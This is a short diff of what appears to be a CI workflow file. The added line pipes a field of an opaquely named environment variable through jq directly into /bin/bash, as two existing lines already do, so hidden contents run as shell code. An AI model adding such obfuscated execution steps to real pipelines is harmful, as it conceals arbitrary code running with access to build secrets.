@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
           echo $fsxn35800 | jq -r .ew102 | /bin/bash
+          echo $sousm0 | jq -r .yjcno1376 | /bin/bash
 
       - name: Store results
         if: always()
